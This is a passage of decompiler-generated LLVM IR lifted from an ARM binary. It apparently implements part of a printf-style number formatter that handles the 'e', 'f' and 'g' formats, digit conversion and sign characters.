  %v3_2b140 = or i1 %v9_2b13c, %v2_2b140
  br i1 %v3_2b140, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_2b134
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_2b138, i32* %r2.global-to-local, align 4
  store i32 %v2_2b138, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_2b134, %bb230
  %v2_2b160 = phi i32 [ %v2_2b138, %bb230 ], [ %v0_2b13c, %dec_label_pc_2b134 ]
  %v4_2b154144 = phi i32 [ %v2_2b138, %bb230 ], [ %v2_2b0d8, %dec_label_pc_2b134 ]
  %v2_2b14c = xor i1 %v9_2b13c, true
  %v3_2b14c = and i1 %v3_2b13c, %v2_2b14c
  br i1 %v3_2b14c, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_2b140, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_2b150 = load i32, i32* @lr, align 4
  %v5_2b150 = add i32 %v4_2b150, 1
  store i32 %v5_2b150, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_2b14c, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_2b154 = add i32 %v4_2b154144, 2
  store i32 %v5_2b154, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2b15c = load i32, i32* %sb.global-to-local, align 4
  %v7_2b15c = icmp eq i32 %v0_2b15c, 103
  store i1 %v7_2b15c, i1* %cpsr_z.global-to-local, align 1
  %v3_2b160 = add i32 %v2_2b160, 1
  %v4_2b160 = inttoptr i32 %v3_2b160 to i8*
  store i8 0, i8* %v4_2b160, align 1
  %v0_2b164 = load i32, i32* %r1.global-to-local, align 4
  %v1_2b164 = add i32 %v0_2b164, 1
  store i32 %v1_2b164, i32* %lr.global-to-local, align 4
  %v0_2b168 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2b168, label %dec_label_pc_2b16c, label %dec_label_pc_2b194

dec_label_pc_2b16c:                               ; preds = %bb236
  %v0_2b16c = load i32, i32* %r0.global-to-local, align 4
  %v1_2b16c = load i32, i32* %ip.global-to-local, align 4
  %v2_2b16c = sub i32 %v0_2b16c, %v1_2b16c
  %v4_2b16c = xor i32 %v1_2b16c, %v0_2b16c
  %v5_2b16c = xor i32 %v2_2b16c, %v0_2b16c
  %v6_2b16c = and i32 %v5_2b16c, %v4_2b16c
  %v7_2b16c = icmp slt i32 %v6_2b16c, 0
  %v8_2b16c = icmp slt i32 %v2_2b16c, 0
  %v9_2b16c = icmp eq i32 %v0_2b16c, %v1_2b16c
  %v3_2b170 = xor i1 %v8_2b16c, %v7_2b16c
  %v4_2b170 = or i1 %v9_2b16c, %v3_2b170
  %.258 = zext i1 %v4_2b170 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_2b178 = add i32 %v0_2b16c, 4
  %v3_2b178 = sub i32 0, %v0_2b16c
  %v4_2b178 = and i32 %v1_2b178, %v3_2b178
  %v5_2b178 = icmp slt i32 %v4_2b178, 0
  %v6_2b178 = icmp slt i32 %v1_2b178, 0
  %v7_2b178 = icmp eq i32 %v1_2b178, 0
  store i1 %v7_2b178, i1* %cpsr_z.global-to-local, align 1
  %v2_2b17c = xor i1 %v6_2b178, %v5_2b178
  br i1 %v2_2b17c, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_2b16c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2b4b0

bb239:                                            ; preds = %dec_label_pc_2b16c
  %v2_2b180 = icmp eq i1 %v4_2b170, false
  store i1 %v2_2b180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b180, label %dec_label_pc_2b4b0, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_2b184 = sub i32 %v1_2b16c, %v0_2b16c
  store i32 %v3_2b184, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2b1a0

dec_label_pc_2b194:                               ; preds = %bb236
  %v0_2b194 = load i32, i32* %sb.global-to-local, align 4
  %v7_2b194 = icmp eq i32 %v0_2b194, 102
  store i1 %v7_2b194, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_2b194, i32* %r8.global-to-local, align 4
  br i1 %v7_2b194, label %dec_label_pc_2b194.dec_label_pc_2b1a0_crit_edge, label %dec_label_pc_2b1b0

dec_label_pc_2b194.dec_label_pc_2b1a0_crit_edge:  ; preds = %dec_label_pc_2b194
  %v0_2b1a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2b1a0

dec_label_pc_2b1a0:                               ; preds = %.thread24, %dec_label_pc_2b194.dec_label_pc_2b1a0_crit_edge
  %v0_2b1a0 = phi i32 [ %v0_2b1a0.pre, %dec_label_pc_2b194.dec_label_pc_2b1a0_crit_edge ], [ %v0_2b16c, %.thread24 ]
  %v1_2b1a0 = icmp slt i32 %v0_2b1a0, 0
  %v2_2b1a0 = icmp eq i32 %v0_2b1a0, 0
  store i1 %v2_2b1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_2b1a0, label %bb240, label %dec_label_pc_2b1b0

bb240:                                            ; preds = %dec_label_pc_2b1a0
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_2b1a8 = load i32, i32* %r2.global-to-local, align 4
  %v6_2b1a8 = add i32 %v5_2b1a8, -1
  %v7_2b1a8 = inttoptr i32 %v6_2b1a8 to i8*
  store i8 48, i8* %v7_2b1a8, align 1
  %v8_2b1a8 = load i32, i32* %r2.global-to-local, align 4
  %v9_2b1a8 = add i32 %v8_2b1a8, -1
  store i32 %v9_2b1a8, i32* %r2.global-to-local, align 4
  %v0_2b1ac.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_2b1e0.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_2b1b0

dec_label_pc_2b1b0:                               ; preds = %bb240, %dec_label_pc_2b1a0, %dec_label_pc_2b4b0, %dec_label_pc_2b194
  %v1_2b1e0 = phi i32 [ %v1_2b164, %dec_label_pc_2b194 ], [ %v1_2b164, %dec_label_pc_2b4b0 ], [ %v1_2b1e0.pre.pre, %bb240 ], [ %v1_2b164, %dec_label_pc_2b1a0 ]
  %v1_2b25830 = phi i32 [ 0, %dec_label_pc_2b194 ], [ 0, %dec_label_pc_2b4b0 ], [ %v0_2b1ac.pre, %bb240 ], [ %v0_2b1a0, %dec_label_pc_2b1a0 ]
  store i32 %v1_2b25830, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_2b1bc = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_2b1bc, i32* %r3.global-to-local, align 4
  %v0_2b1c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2b1c8 = inttoptr i32 %v0_2b1c8 to i8*
  %v2_2b1c8 = load i8, i8* %v1_2b1c8, align 1
  %v3_2b1c8 = zext i8 %v2_2b1c8 to i32
  store i32 %v3_2b1c8, i32* %r3.global-to-local, align 4
  %v5_2b1c8 = add i32 %v0_2b1c8, 1
  store i32 %v5_2b1c8, i32* %r2.global-to-local, align 4
  %v1_2b1cc = icmp slt i32 %v1_2b25830, 0
  %v2_2b1cc = icmp eq i32 %v1_2b25830, 0
  store i1 %v2_2b1cc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_2b1c8, i32* %r6.global-to-local, align 4
  store i32 %v3_2b1c8, i32* %stack_var_-42, align 4
  %v2_2b1e0 = sub i32 %v1_2b1e0, %v5_2b1c8
  store i32 %v2_2b1e0, i32* %ip.global-to-local, align 4
  br i1 %v1_2b1cc, label %.thread, label %dec_label_pc_2b1ec

.thread:                                          ; preds = %dec_label_pc_2b1b0
  %v5_2b1e4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_2b1e4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b268

dec_label_pc_2b1ec:                               ; preds = %dec_label_pc_2b1b0
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_2b1f0 = sub i32 %v1_2b25830, %v2_2b1e0
  %v4_2b1f0 = xor i32 %v2_2b1e0, %v1_2b25830
  %v5_2b1f0 = xor i32 %v2_2b1f0, %v1_2b25830
  %v6_2b1f0 = and i32 %v5_2b1f0, %v4_2b1f0
  %v7_2b1f0 = icmp slt i32 %v6_2b1f0, 0
  %v8_2b1f0 = icmp slt i32 %v2_2b1f0, 0
  %v9_2b1f0 = icmp eq i32 %v1_2b25830, %v2_2b1e0
  store i1 %v9_2b1f0, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_2b1fc = xor i1 %v8_2b1f0, %v7_2b1f0
  br i1 %v2_2b1fc, label %dec_label_pc_2b248, label %dec_label_pc_2b200

dec_label_pc_2b200:                               ; preds = %dec_label_pc_2b1ec
  store i32 %v2_2b1f0, i32* %r2.global-to-local, align 4
  %v2_2b204 = icmp eq i32 %v2_2b1f0, 0
  store i1 %v2_2b204, i1* %cpsr_z.global-to-local, align 1
  %v2_2b208 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2b208, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_2b1f0, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_2b21c

.thread148:                                       ; preds = %dec_label_pc_2b200
  %v7_2b210 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_2b210, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_2b21c:                               ; preds = %dec_label_pc_2b200
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33357), i32* %r3.global-to-local, align 4
  %v2_2b22c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_2b22c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_2b268

dec_label_pc_2b248:                               ; preds = %dec_label_pc_2b1ec
  store i1 %v2_2b1cc, i1* %cpsr_z.global-to-local, align 1
  %v2_2b24c = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_2b24c, i32* %lr.global-to-local, align 4
  br i1 %v2_2b1cc, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_2b248
  %v3_2b254 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_2b254, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_2b248
  %v3_2b258 = sub i32 %v2_2b1e0, %v1_2b25830
  store i32 %v3_2b258, i32* %ip.global-to-local, align 4
  %v3_2b25c63 = add i32 %v5_2b1c8, %v1_2b25830
  store i32 %v3_2b25c63, i32* %r6.global-to-local, align 4
  %v3_2b260 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_2b260, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_2b2a8265 = phi i32 [ %v3_2b254, %bb242 ], [ %v3_2b260, %bb243 ], [ %v7_2b210, %.thread148 ]
  %v0_2b27c102 = phi i32 [ %v2_2b1e0, %bb242 ], [ %v3_2b258, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2b268

dec_label_pc_2b268:                               ; preds = %.thread, %dec_label_pc_2b21c, %.thread34
  %v1_2b2a8 = phi i32 [ %v2_2b22c, %dec_label_pc_2b21c ], [ %v1_2b2a8265, %.thread34 ], [ %v5_2b1e4, %.thread ]
  %v0_2b2bc109 = phi i32 [ -1, %dec_label_pc_2b21c ], [ -1, %.thread34 ], [ %v1_2b25830, %.thread ]
  %v0_2b27c = phi i32 [ 0, %dec_label_pc_2b21c ], [ %v0_2b27c102, %.thread34 ], [ %v2_2b1e0, %.thread ]
  %v3_2b268 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_2b268, i32* %r2.global-to-local, align 4
  %v1_2b26c = add i32 %v3_2b268, 12
  %v2_2b26c = inttoptr i32 %v1_2b26c to i32*
  %v3_2b26c = load i32, i32* %v2_2b26c, align 4
  %v1_2b270 = and i32 %v3_2b26c, 16
  store i32 %v1_2b270, i32* %r4.global-to-local, align 4
  %v2_2b270 = icmp eq i32 %v1_2b270, 0
  %tmp270 = zext i1 %v2_2b270 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_2b27c = icmp eq i32 %v0_2b27c, 0
  store i1 %v2_2b27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b27c, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_2b268
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2b298

bb246:                                            ; preds = %dec_label_pc_2b268
  store i1 %v2_2b270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b270, label %dec_label_pc_2b28c, label %dec_label_pc_2b298

dec_label_pc_2b28c:                               ; preds = %bb246
  %v0_2b28c = load i32, i32* %sb.global-to-local, align 4
  %v7_2b28c = icmp eq i32 %v0_2b28c, 103
  store i1 %v7_2b28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b28c, label %dec_label_pc_2b2bc, label %bb247

bb247:                                            ; preds = %dec_label_pc_2b28c
  %v1_2b290 = load i32, i32* %fp.global-to-local, align 4
  %v3_2b290 = icmp eq i32 %v1_2b290, 0
  store i1 %v3_2b290, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_2b290, 1
  br i1 %tmp248, label %dec_label_pc_2b2bc, label %dec_label_pc_2b298

dec_label_pc_2b298:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33360), i32* %r3.global-to-local, align 4
  %v2_2b2a8 = inttoptr i32 %v1_2b2a8 to i32*
  store i32 112, i32* %v2_2b2a8, align 4
  %v0_2b2ac = load i32, i32* %r3.global-to-local, align 4
  %v1_2b2ac = add i32 %v0_2b2ac, 16
  store i32 %v1_2b2ac, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_2b2b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b2b4 = add i32 %v0_2b2b4, 4
  %v2_2b2b4 = inttoptr i32 %v1_2b2b4 to i32*
  store i32 1, i32* %v2_2b2b4, align 4
  %v4_2b2b4 = add i32 %v0_2b2b4, 8
  %v5_2b2b4 = inttoptr i32 %v4_2b2b4 to i32*
  %v6_2b2b4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2b2b4, i32* %v5_2b2b4, align 4
  %v0_2b2b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b2b8 = add i32 %v0_2b2b8, 12
  store i32 %v1_2b2b8, i32* %r7.global-to-local, align 4
  %v0_2b2bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2b2bc

dec_label_pc_2b2bc:                               ; preds = %dec_label_pc_2b28c, %bb247, %dec_label_pc_2b298
  %v1_2b2dc = phi i32 [ %v1_2b2a8, %bb247 ], [ %v1_2b2b8, %dec_label_pc_2b298 ], [ %v1_2b2a8, %dec_label_pc_2b28c ]
  %v0_2b2bc = phi i32 [ %v0_2b2bc109, %bb247 ], [ %v0_2b2bc.pre, %dec_label_pc_2b298 ], [ %v0_2b2bc109, %dec_label_pc_2b28c ]
  %v1_2b2bc = add i32 %v0_2b2bc, 1
  store i32 %v1_2b2bc, i32* %lr.global-to-local, align 4
  %v6_2b2bc = icmp slt i32 %v1_2b2bc, 0
  %v7_2b2bc = icmp eq i32 %v1_2b2bc, 0
  store i1 %v7_2b2bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_2b2bc, label %dec_label_pc_2b2c4, label %dec_label_pc_2b2e8

dec_label_pc_2b2c4:                               ; preds = %dec_label_pc_2b2bc
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33357), i32* %r3.global-to-local, align 4
  %v1_2b2d4 = sub i32 -1, %v0_2b2bc
  store i32 %v1_2b2d4, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_2b2dc = inttoptr i32 %v1_2b2dc to i32*
  store i32 176, i32* %v2_2b2dc, align 4
  %v0_2b2e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b2e0 = add i32 %v0_2b2e0, 4
  %v2_2b2e0 = inttoptr i32 %v1_2b2e0 to i32*
  %v3_2b2e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_2b2e0, i32* %v2_2b2e0, align 4
  %v4_2b2e0 = add i32 %v0_2b2e0, 8
  %v5_2b2e0 = inttoptr i32 %v4_2b2e0 to i32*
  %v6_2b2e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2b2e0, i32* %v5_2b2e0, align 4
  %v0_2b2e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b2e4 = add i32 %v0_2b2e4, 12
  store i32 %v1_2b2e4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b2e8

dec_label_pc_2b2e8:                               ; preds = %dec_label_pc_2b2bc, %dec_label_pc_2b2c4
  %v2_2b2f0 = phi i32 [ %v1_2b2dc, %dec_label_pc_2b2bc ], [ %v1_2b2e4, %dec_label_pc_2b2c4 ]
  %v0_2b2e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_2b2e8 = icmp eq i32 %v0_2b2e8, 0
  store i1 %v2_2b2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b2e8, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_2b2e8
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_2b2f0 = inttoptr i32 %v2_2b2f0 to i32*
  store i32 112, i32* %v3_2b2f0, align 4
  %v1_2b2f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_2b2f4 = load i32, i32* %r7.global-to-local, align 4
  %v3_2b2f4 = add i32 %v2_2b2f4, 8
  %v4_2b2f4 = inttoptr i32 %v3_2b2f4 to i32*
  store i32 %v1_2b2f4, i32* %v4_2b2f4, align 4
  %v1_2b2f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_2b2f8 = load i32, i32* %r7.global-to-local, align 4
  %v3_2b2f8 = add i32 %v2_2b2f8, 4
  %v4_2b2f8 = inttoptr i32 %v3_2b2f8 to i32*
  store i32 %v1_2b2f8, i32* %v4_2b2f8, align 4
  %v1_2b2fc = load i32, i32* %r7.global-to-local, align 4
  %v2_2b2fc = add i32 %v1_2b2fc, 12
  store i32 %v2_2b2fc, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_2b2e8, %bb249
  %v1_2b334 = phi i32 [ %v2_2b2f0, %dec_label_pc_2b2e8 ], [ %v2_2b2fc, %bb249 ]
  %v0_2b300 = load i32, i32* %sb.global-to-local, align 4
  %v7_2b300 = icmp eq i32 %v0_2b300, 103
  store i1 %v7_2b300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b300, label %dec_label_pc_2b308, label %dec_label_pc_2b310

dec_label_pc_2b308:                               ; preds = %.thread46
  %v0_2b308 = load i32, i32* %r4.global-to-local, align 4
  %v2_2b308 = icmp eq i32 %v0_2b308, 0
  store i1 %v2_2b308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b308, label %dec_label_pc_2b340, label %dec_label_pc_2b310

dec_label_pc_2b310:                               ; preds = %.thread46, %dec_label_pc_2b308
  %v0_2b310 = load i32, i32* %lr.global-to-local, align 4
  %v1_2b310 = load i32, i32* %ip.global-to-local, align 4
  %v2_2b310 = sub i32 %v1_2b310, %v0_2b310
  store i32 %v2_2b310, i32* %r1.global-to-local, align 4
  %v1_2b314 = load i32, i32* %fp.global-to-local, align 4
  %v2_2b314 = sub i32 %v2_2b310, %v1_2b314
  %v4_2b314 = xor i32 %v1_2b314, %v2_2b310
  %v5_2b314 = xor i32 %v2_2b314, %v2_2b310
  %v6_2b314 = and i32 %v5_2b314, %v4_2b314
  %v7_2b314 = icmp slt i32 %v6_2b314, 0
  %v8_2b314 = icmp slt i32 %v2_2b314, 0
  %v9_2b314 = icmp eq i32 %v2_2b310, %v1_2b314
  store i1 %v9_2b314, i1* %cpsr_z.global-to-local, align 1
  %v2_2b318 = xor i1 %v8_2b314, %v7_2b314
  br i1 %v2_2b318, label %dec_label_pc_2b31c, label %dec_label_pc_2b340

dec_label_pc_2b31c:                               ; preds = %dec_label_pc_2b310
  %v2_2b328 = sub i32 %v1_2b314, %v2_2b310
  store i32 %v2_2b328, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33357), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_2b334 = inttoptr i32 %v1_2b334 to i32*
  store i32 176, i32* %v2_2b334, align 4
  %v0_2b338 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b338 = add i32 %v0_2b338, 4
  %v2_2b338 = inttoptr i32 %v1_2b338 to i32*
  %v3_2b338 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_2b338, i32* %v2_2b338, align 4
  %v4_2b338 = add i32 %v0_2b338, 8
  %v5_2b338 = inttoptr i32 %v4_2b338 to i32*
  %v6_2b338 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_2b338, i32* %v5_2b338, align 4
  %v0_2b33c = load i32, i32* %r7.global-to-local, align 4
  %v1_2b33c = add i32 %v0_2b33c, 12
  store i32 %v1_2b33c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b340

dec_label_pc_2b340:                               ; preds = %dec_label_pc_2b310, %dec_label_pc_2b308, %dec_label_pc_2b31c
  %v1_2b3d4.pre.pre = phi i32 [ %v1_2b334, %dec_label_pc_2b310 ], [ %v1_2b334, %dec_label_pc_2b308 ], [ %v1_2b33c, %dec_label_pc_2b31c ]
  %v0_2b340 = load i32, i32* %r8.global-to-local, align 4
  %v7_2b340 = icmp eq i32 %v0_2b340, 102
  store i1 %v7_2b340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b340, label %dec_label_pc_2b3c8, label %dec_label_pc_2b348

dec_label_pc_2b348:                               ; preds = %dec_label_pc_2b340
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2b34c = load i32, i32* %r0.global-to-local, align 4
  %v1_2b34c = icmp slt i32 %v0_2b34c, 0
  %v2_2b34c = icmp eq i32 %v0_2b34c, 0
  store i1 %v2_2b34c, i1* %cpsr_z.global-to-local, align 1
  %v4_2b350 = select i1 %tmp275, i32 %v4_2b06c126130, i32 101
  store i32 %v4_2b350, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_2b360 = sub i32 0, %v0_2b34c
  %storemerge158 = select i1 %v1_2b34c, i32 %v4_2b360, i32 %v0_2b34c
  %tmp271 = ashr i32 %v0_2b34c, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_2b368 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_2b368, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2b370

dec_label_pc_2b370:                               ; preds = %dec_label_pc_2b3a0, %dec_label_pc_2b370, %dec_label_pc_2b348
  %v2_2b388 = phi i32 [ %v2_2b368, %dec_label_pc_2b348 ], [ %v6_2b388, %dec_label_pc_2b370 ], [ %v6_2b388, %dec_label_pc_2b3a0 ]
  %v0_2b380 = phi i32 [ %storemerge158, %dec_label_pc_2b348 ], [ %v2_2b38c, %dec_label_pc_2b370 ], [ %v2_2b38c, %dec_label_pc_2b3a0 ]
  %v3_2b378 = urem i32 %v0_2b380, 10
  %v1_2b37c = or i32 %v3_2b378, 48
  store i32 %v1_2b37c, i32* %r3.global-to-local, align 4
  store i32 %v0_2b380, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_2b388 = trunc i32 %v1_2b37c to i8
  %v3_2b388 = add i32 %v2_2b388, -1
  %v4_2b388 = inttoptr i32 %v3_2b388 to i8*
  store i8 %v1_2b388, i8* %v4_2b388, align 1
  %v5_2b388 = load i32, i32* %r6.global-to-local, align 4
  %v6_2b388 = add i32 %v5_2b388, -1
  store i32 %v6_2b388, i32* %r6.global-to-local, align 4
  %v0_2b38c = load i32, i32* %r0.global-to-local, align 4
  %v1_2b38c = load i32, i32* %r1.global-to-local, align 4
  %v2_2b38c = sdiv i32 %v0_2b38c, %v1_2b38c
  store i32 %v2_2b38c, i32* %r0.global-to-local, align 4
  %v0_2b390 = load i32, i32* %r8.global-to-local, align 4
  %v1_2b390 = add i32 %v0_2b390, 1
  store i32 %v1_2b390, i32* %r8.global-to-local, align 4
  %v7_2b394 = icmp eq i32 %v1_2b390, 3
  store i1 %v7_2b394, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_2b38c, i32* %r5.global-to-local, align 4
  br i1 %v7_2b394, label %dec_label_pc_2b370, label %dec_label_pc_2b3a0

dec_label_pc_2b3a0:                               ; preds = %dec_label_pc_2b370
  %v2_2b3a0 = icmp eq i32 %v2_2b38c, 0
  store i1 %v2_2b3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b3a0, label %dec_label_pc_2b3a8, label %dec_label_pc_2b370

dec_label_pc_2b3a8:                               ; preds = %dec_label_pc_2b3a0
  %v1_2b3a8 = add i32 %v5_2b388, -2
  store i32 %v1_2b3a8, i32* %r3.global-to-local, align 4
  %v0_2b3ac = load i32, i32* %sl.global-to-local, align 4
  %v1_2b3ac = trunc i32 %v0_2b3ac to i8
  %v4_2b3ac = inttoptr i32 %v1_2b3a8 to i8*
  store i8 %v1_2b3ac, i8* %v4_2b3ac, align 1
  %v0_2b3b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2b3b0 = add i32 %v0_2b3b0, -1
  store i32 %v1_2b3b0, i32* %r2.global-to-local, align 4
  %v0_2b3b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b3b4 = trunc i32 %v0_2b3b4 to i8
  %v4_2b3b4 = inttoptr i32 %v1_2b3b0 to i8*
  store i8 %v1_2b3b4, i8* %v4_2b3b4, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_2b3bc = load i32, i32* %r7.global-to-local, align 4
  %v1_2b3bc = inttoptr i32 %v0_2b3bc to i32*
  store i32 112, i32* %v1_2b3bc, align 4
  %v3_2b3bc = add i32 %v0_2b3bc, 4
  %v4_2b3bc = inttoptr i32 %v3_2b3bc to i32*
  %v5_2b3bc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_2b3bc, i32* %v4_2b3bc, align 4
  %v0_2b3c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_2b3c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_2b3c0 = add i32 %v1_2b3c0, 8
  %v3_2b3c0 = inttoptr i32 %v2_2b3c0 to i32*
  store i32 %v0_2b3c0, i32* %v3_2b3c0, align 4
  %v0_2b3c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_2b3c4 = add i32 %v0_2b3c4, 12
  store i32 %v1_2b3c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b3c8

dec_label_pc_2b3c8:                               ; preds = %dec_label_pc_2b340, %.thread124, %dec_label_pc_2b3a8
  %v1_2b3d4.pre = phi i32 [ %v2_2aea0, %.thread124 ], [ %v1_2b3c4, %dec_label_pc_2b3a8 ], [ %v1_2b3d4.pre.pre, %dec_label_pc_2b340 ]
  %v2_2b3c8 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_2b3c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2b3cc

dec_label_pc_2b3cc:                               ; preds = %dec_label_pc_2b3cc, %dec_label_pc_2b3c8
  %v0_2b3cc = phi i32 [ %v2_2b3c8, %dec_label_pc_2b3c8 ], [ %v4_2b3cc, %dec_label_pc_2b3cc ]
  %stack_var_-188.0 = phi i32 [ %v3_2ad3c, %dec_label_pc_2b3c8 ], [ %v2_2b3d8, %dec_label_pc_2b3cc ]
  %v1_2b3cc = inttoptr i32 %v0_2b3cc to i32*
  %v2_2b3cc = load i32, i32* %v1_2b3cc, align 4
  store i32 %v2_2b3cc, i32* %r3.global-to-local, align 4
  %v4_2b3cc = add i32 %v0_2b3cc, 12
  store i32 %v4_2b3cc, i32* %r2.global-to-local, align 4
  %v3_2b3d4 = icmp ult i32 %v4_2b3cc, %v1_2b3d4.pre
  %v2_2b3d8 = sub i32 %stack_var_-188.0, %v2_2b3cc
  store i32 %v2_2b3d8, i32* %ip.global-to-local, align 4
  br i1 %v3_2b3d4, label %dec_label_pc_2b3cc, label %dec_label_pc_2b3e4

dec_label_pc_2b3e4:                               ; preds = %dec_label_pc_2b3cc
  %v3_2b3e4 = load i8, i8* %stack_var_-46, align 1
